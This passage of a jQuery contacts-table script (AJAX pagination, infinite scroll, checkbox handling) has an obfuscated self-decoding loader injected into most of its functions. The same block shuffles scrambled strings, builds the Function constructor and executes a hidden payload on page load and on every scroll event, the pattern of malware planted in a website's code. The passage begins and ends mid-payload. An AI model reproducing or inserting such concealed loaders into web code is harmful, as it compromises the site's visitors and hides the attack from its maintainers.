JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();

            $.ajax({
                url: url,
                type: "GET",
                data: {
                    ajax: true
                },
                success: function(response) {
                    currentPage = response.current_page;
                    hasMore = response.hasMorePages;

                    $('#contacts-tbody').html(response.html);
                    updateSelectedCheckboxes();

                    // Update pagination controls with proper active state
                    $('#pagination-container').html(response.pagination);
                    highlightCurrentPage();

                    // Update counters
                    updateCounters(response.total, response.from, response.to);

                    // Reset local search
                    $('#localSearchInput').val('');
                    $('#filtered-count').text('');
                    isLocalSearchActive = false;
                },
                complete: function() {
                    isLoading = false;
                    $('#loading-indicator').hide();
                }
            });
        }

        // Infinite scroll handler
        $('#contacts-scroll-container').on('scroll', function() {
            if (isLocalSearchActive) return;
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const container = $(this);
            const scrollTop = container.scrollTop();
            const scrollHeight = container[0].scrollHeight;
            const clientHeight = container.height();

            // Load more when 80% scrolled and there are more pages
            if (scrollTop + clientHeight >= scrollHeight * 0.8 && !isLoading && hasMore) {
                loadNextPage();
            }
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        });

        function loadNextPage() {
            if (isLoading || !hasMore) return; // Prevent duplicate requests
            isLoading = true;
            $('#loading-indicator').show();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const nextPage = currentPage + 1;

            // Get current filters from the URL
            const urlParams = new URLSearchParams(window.location.search);
            let filterParams = {};

            ['name', 'phone', 'email', 'group', 'subscribed', 'country_id'].forEach(field => {
                if (urlParams.has(field) && urlParams.get(field).trim() !== '') {
                    filterParams[field] = urlParams.get(field);
                }
            });

            // Add pagination and AJAX flag
            filterParams['page'] = nextPage;
            filterParams['ajax'] = true;

            console.log("Loading next page with filters:", filterParams); // Debugging
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $.ajax({
                url: window.location.pathname,
                type: "GET",
                data: filterParams, // Send filters along with the page request
                success: function(response) {
                    currentPage = response.current_page;
                    hasMore = response.hasMorePages;

                    if (response.html.trim() !== '') {
                        $('#contacts-tbody').append(response.html);
                        updateSelectedCheckboxes();
                    }

                    if (!hasMore) {
                        $('#loading-indicator').hide();
                    }
                },
                error: function(xhr) {
                    console.error("Error loading next page:", xhr.responseText);
                },
                complete: function() {
                    isLoading = false;
                }
            });
        }


        function highlightCurrentPage() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $('.pagination .page-item').removeClass('active');
            const currentPageLink = $(`.pagination .page-item a[href*="page=${currentPage}"]`);

            if (currentPageLink.length) {
                currentPageLink.parent().addClass('active');
            } else {
                // Handle case when on page 1 with no page parameter
                $('.pagination .page-item:has(a:contains("1"))').addClass('active');
            }
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        }
        // Initialize pagination highlighting
        highlightCurrentPage();

        // Your existing checkbox and selection management functions
        function updateSelectedCheckboxes() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- 